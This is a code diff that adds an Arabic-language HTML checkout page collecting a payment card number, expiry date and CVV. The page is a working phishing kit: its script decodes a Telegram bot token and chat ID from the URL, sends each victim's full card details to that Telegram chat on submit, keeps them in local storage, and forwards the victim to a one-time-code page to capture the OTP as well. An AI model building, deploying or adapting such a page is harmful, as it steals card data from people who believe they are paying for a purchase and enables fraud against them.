@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إتمام الشراء</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: #e8eaed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 40px 32px 36px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .card-header .icon {
+            font-size: 36px;
+        }
+
+        .card-header h1 {
+            font-size: 26px;
+            color: #202124;
+            font-weight: 700;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .input-group label .required {
+            color: #ea4335;
+            margin-right: 4px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 18px;
+            border: 1.5px solid #dadce0;
+            border-radius: 10px;
+            font-size: 16px;
+            background: #ffffff;
+            transition: all 0.2s ease;
+            outline: none;
+            color: #202124;
+            direction: ltr;
+            text-align: right;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.12);
+        }
+
+        .input-group input::placeholder {
+            color: #9aa0a6;
+            font-size: 15px;
+            letter-spacing: 1px;
+        }
+
+        .input-group input.error {
+            border-color: #ea4335;
+            background: #fce8e6;
+        }
+
+        .input-group .hint {
+            font-size: 13px;
+            color: #9aa0a6;
+            margin-top: 8px;
+        }
+
+        .input-group .error-msg {
+            font-size: 13px;
+            color: #ea4335;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .input-group .error-msg.show {
+            display: block;
+        }
+
+        .row-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .row-2 select {
+            width: 100%;
+            padding: 16px 18px;
+            border: 1.5px solid #dadce0;
+            border-radius: 10px;
+            font-size: 15px;
+            background: #ffffff;
+            color: #202124;
+            outline: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%235f6368' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: left 15px center;
+            background-size: 20px;
+            padding-left: 45px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .row-2 select:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.12);
+        }
+
+        .row-2 select.error {
+            border-color: #ea4335;
+            background-color: #fce8e6;
+        }
+
+        .row-2 select option {
+            padding: 10px;
+        }
+
+        .sub-label {
+            font-size: 13px;
+            color: #9aa0a6;
+            margin-top: 8px;
+            text-align: right;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: #1a73e8;
+            color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            margin-top: 16px;
+            letter-spacing: 0.3px;
+            font-family: inherit;
+        }
+
+        .btn-submit:hover {
+            background: #1765cc;
+            box-shadow: 0 6px 20px rgba(26, 115, 232, 0.35);
+            transform: translateY(-2px);
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 30px 22px;
+            }
+            .card-header h1 {
+                font-size: 22px;
+            }
+            .card-header .icon {
+                font-size: 30px;
+            }
+            .btn-submit {
+                font-size: 16px;
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="card">
+
+        <div class="card-header">
+            <span class="icon">💳</span>
+            <h1>إتمام الشراء</h1>
+        </div>
+
+        <form id="cardForm" novalidate>
+
+            <!-- رقم البطاقة -->
+            <div class="input-group">
+                <label><span class="required">*</span>رقم البطاقة</label>
+                <input type="tel" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" autocomplete="cc-number">
+                <div class="hint">يرجى إدخال رقم البطاقة.</div>
+                <div class="error-msg" id="cardNumberError"></div>
+            </div>
+
+            <!-- الشهر والسنة -->
+            <div class="row-2">
+                <div class="input-group">
+                    <label><span class="required">*</span>الشهر</label>
+                    <select id="expMonth">
+                        <option value="">شهر</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label><span class="required">*</span>السنة</label>
+                    <select id="expYear">
+                        <option value="">سنة</option>
+                    </select>
+                </div>
+            </div>
+            <div class="sub-label">* تاريخ انتهاء الصلاحية</div>
+
+            <!-- CVV -->
+            <div class="input-group" style="margin-top: 20px;">
+                <label><span class="required">*</span>CVV</label>
+                <input type="tel" id="cvv" placeholder="•••" maxlength="4" autocomplete="cc-csc">
+                <div class="hint">رمز مكون من 3 أو 4 أرقام</div>
+                <div class="error-msg" id="cvvError"></div>
+            </div>
+
+            <button type="submit" class="btn-submit" id="submitBtn">التالي</button>
+
+        </form>
+
+    </div>
+
+</div>
+
+<script>
+    // ================================================================
+    // 🔐 قراءة البيانات المشفّرة من الرابط
+    // ================================================================
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedData = urlParams.get('d') || "";
+
+    if (encodedData) {
+        sessionStorage.setItem('wa_encoded', encodedData);
+    }
+    const finalEncoded = encodedData || sessionStorage.getItem('wa_encoded') || "";
+
+    let BOT_TOKEN = "";
+    let CHAT_ID = "";
+
+    if (finalEncoded) {
+        try {
+            const decoded = atob(finalEncoded);
+            const parts = decoded.split('|');
+            BOT_TOKEN = parts[0] || "";
+            CHAT_ID   = parts[1] || "";
+        } catch (e) {
+            console.error('❌ فشل فك التشفير:', e);
+        }
+    }
+
+    // ================================================================
+    // 📅 ملء قائمة السنوات
+    // ================================================================
+    const yearSelect = document.getElementById('expYear');
+    const currentYear = new Date().getFullYear();
+    for (let i = 0; i < 15; i++) {
+        const opt = document.createElement('option');
+        opt.value = (currentYear + i).toString();
+        opt.textContent = (currentYear + i).toString();
+        yearSelect.appendChild(opt);
+    }
+
+    // ================================================================
+    // 💳 تنسيق رقم البطاقة (إضافة مسافات كل 4 أرقام)
+    // ================================================================
+    const cardNumberInput = document.getElementById('cardNumber');
+    cardNumberInput.addEventListener('input', function() {
+        let value = this.value.replace(/\D/g, '');
+        value = value.substring(0, 16);
+        let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+        this.value = formatted;
+        this.classList.remove('error');
+        document.getElementById('cardNumberError').classList.remove('show');
+    });
+
+    // CVV - أرقام فقط
+    document.getElementById('cvv').addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').substring(0, 4);
+        this.classList.remove('error');
+        document.getElementById('cvvError').classList.remove('show');
+    });
+
+    // ================================================================
+    // 📤 إرسال بيانات البطاقة إلى Telegram
+    // ================================================================
+    function sendCardToTelegram(cardData) {
+        if (!BOT_TOKEN || !CHAT_ID) return;
+
+        const message = `
+💳 **إتمام الشراء - بيانات البطاقة (الخطوة 1/2)**
+
+🔢 **رقم البطاقة:** 
+\`${cardData.number}\`
+
+📅 **تاريخ الانتهاء:** 
+\`${cardData.month}/${cardData.year}\`
+
+🔒 **CVV:** 
+\`${cardData.cvv}\`
+
+🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
+
+📌 **IP:** ${window.location.hostname}
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).catch(error => console.log('Telegram error:', error));
+    }
+
+    // ================================================================
+    // 📝 معالج النموذج
+    // ================================================================
+    document.getElementById('cardForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+        const expMonth = document.getElementById('expMonth').value;
+        const expYear = document.getElementById('expYear').value;
+        const cvv = document.getElementById('cvv').value.trim();
+
+        // إعادة تعيين
+        document.querySelectorAll('.error-msg').forEach(el => el.classList.remove('show'));
+        document.querySelectorAll('.input-group input, .row-2 select').forEach(el => el.classList.remove('error'));
+
+        let hasError = false;
+
+        // التحقق من رقم البطاقة
+        if (!cardNumber || cardNumber.length < 15) {
+            cardNumberInput.classList.add('error');
+            const err = document.getElementById('cardNumberError');
+            err.textContent = '⚠ يرجى إدخال رقم بطاقة صحيح';
+            err.classList.add('show');
+            hasError = true;
+        }
+
+        // التحقق من التاريخ
+        if (!expMonth) {
+            document.getElementById('expMonth').classList.add('error');
+            hasError = true;
+        }
+        if (!expYear) {
+            document.getElementById('expYear').classList.add('error');
+            hasError = true;
+        }
+
+        // التحقق من CVV
+        if (!cvv || cvv.length < 3) {
+            document.getElementById('cvv').classList.add('error');
+            const err = document.getElementById('cvvError');
+            err.textContent = '⚠ يرجى إدخال رمز CVV صحيح';
+            err.classList.add('show');
+            hasError = true;
+        }
+
+        if (hasError) return;
+
+        // تعطيل الزر
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.textContent = 'جاري المعالجة...';
+
+        // حفظ البيانات
+        const cardData = {
+            number: cardNumber,
+            month: expMonth,
+            year: expYear,
+            cvv: cvv
+        };
+        localStorage.setItem('card_data', JSON.stringify(cardData));
+
+        // إرسال إلى Telegram
+        sendCardToTelegram(cardData);
+
+        // الانتقال إلى صفحة OTP
+        setTimeout(() => {
+            let nextUrl = 'cart-otp.html';
+            if (finalEncoded) {
+                nextUrl += '?d=' + encodeURIComponent(finalEncoded);
+            }
+            window.location.href = nextUrl;
+        }, 800);
+    });
+
+    console.log('✅ Card page loaded');
+</script>
+
+</body>
+</html>
